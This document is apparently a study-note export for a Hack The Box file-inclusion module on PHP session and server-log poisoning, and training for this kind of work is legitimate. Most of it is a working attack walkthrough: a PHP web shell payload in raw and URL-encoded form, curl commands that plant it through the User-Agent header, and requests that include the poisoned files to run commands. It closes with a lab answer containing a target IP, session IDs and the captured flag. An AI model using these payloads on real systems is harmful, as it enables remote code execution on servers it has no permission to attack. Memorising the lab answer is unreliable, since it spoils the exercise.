---
tags: [CWES, HTB, technical-reference]
module: "File Inclusion"
source_file: "CWES.xmind"
---

# Log Poisoning

> [!info] Complete technical reference
> Section imported without removing commands, hints, links, notes, or images.

## Execute privileges should be vulnerable to these attacks:

### File Inclusion Behavior by Technology

| Technology / Function | Read Content | Execute | Remote URL |
|---|---:|---:|---:|
| PHP `include()` / `include_once()` | ✅ | ✅ | ✅ |
| PHP `require()` / `require_once()` | ✅ | ✅ | ❌ |
| Node.js `res.render()` | ✅ | ✅ | ❌ |
| Java `import` | ✅ | ✅ | ✅ |
| .NET `include` | ✅ | ✅ | ✅ |

## PHP Session Poisoning

### saved in

- /var/lib/php/sessions/
  - sess_ prefix
- C:\Windows\Temp\
## examine our PHPSESSID session file

### see if it contains any data we can control and poison

- look at Cookie in inspection or Burp
  - our PHPSESSID cookie
    - nhhv8i0o6ua4g88bkdl9u1fdsd
### it should be stored at

- http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
  - page|s:6:"en.php";preference|s:7:"English";  
    Notice: Undefined variable: p2 in /var/www  
    /html/index.php on line 51
    - contains two values:
      - page
        - is under our control
          - http://<SERVER_IP>:<PORT>/index.php?language=session_poisoning
            - http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
              - page|s: 17:"session_poisoning"; preference|s:7:"Spanish";  
                Notice: Undefined variable: p2 in /var/www  
                /html/index.php on line 51
      - preference
        - is not under our control
### writing PHP code to the session file

- visit non existing page with the name of web shell
  - <?<!-- -->php system($_GET["cmd"]);?>
    - URL encoded web shell
      - http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
- check the session with adding ?cmd=id
  - http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id
    - page|s:30:"uid=33(www-data) gid=33(www-  
      data) groups=33(www-data),4(adm)  
      ";preference|s:7:"Spanish";  
      Notice: Undefined variable: p2 in /var/www  
      /html/index.php on line 51
## Server Log Poisoning

### log files

- Apache
  - Linux
    - /var/log/apache2/
      - access.log
        - User-Agent header in our requests,
          - use it to poison the server logs
            - User-Agent header is also shown on process files under the Linux /proc/ directory. So, we can try including the /proc/self/environ or /proc/self/fd/N files (where N is a PID usually between 0-50)
  - Windows
    - C:\xampp\apache\logs\
- Nginx
  - Linux
    - /var/log/nginx/
  - Windows
    - C:\nginx\log\
### try including the Apache access log

- modify the User-Agent
  - through Burp
    - User-Agent: Apache Log Poisoning
      - http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log
        - Apache Log Poisoning
    - through Burp
      - User-Agent: Apache Log Poisoning
        - http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log
          - Apache Log Poisoning
  - or through cURL
    - echo -n "User-Agent: <?<!-- -->php system(\$_GET['cmd']); ?>" > Poison
      - curl -s "http://<SERVER_IP>:<PORT>/index.php" -H @Poison
- execute this code
  - GET /index.php?language=/var/log/apache2/access.log&cmd=id
    - uid=33(www-data)
### similar log poisoning techniques

- /var/log/sshd.log
  - try logging into them and set the username to PHP code
- /var/log/vsftpd.log
  - try logging into them and set the username to PHP code
- /var/log/mail
  - send an email containing PHP code
## LAB

### Use any of the techniques covered in this section to gain RCE, then submit the output of the following command: pwd

- writing PHP code to the session file
  - visit non existing page with the name of web shell
    - <?<!-- -->php system($_GET["cmd"]);?>
      - URL encoded web shell
        - http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
  - check the session with adding ?cmd=pwd
    - http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=pwd
      - selected_language|s:29:"/var/www/html ";preference|s:7:"Spanish";
### Try to use a different technique to gain RCE and read the flag at /

- send URL encode again (refresh)
- http://154.57.164.83:31973/index.php?language=/var/lib/php/sessions/sess_r544nollof6bjnon94sf8kt8qi&cmd=ls+/
  - c85ee5082f4c723ace6c0796e3a3db09.txt
- send URL encode again (refresh)
- http://154.57.164.83:31973/index.php?language=/var/lib/php/sessions/sess_r544nollof6bjnon94sf8kt8qi&cmd=cat+/c85ee5082f4c723ace6c0796e3a3db09.txt
  - HTB{1095_5#0u1d_n3v3r_63_3xp053d}
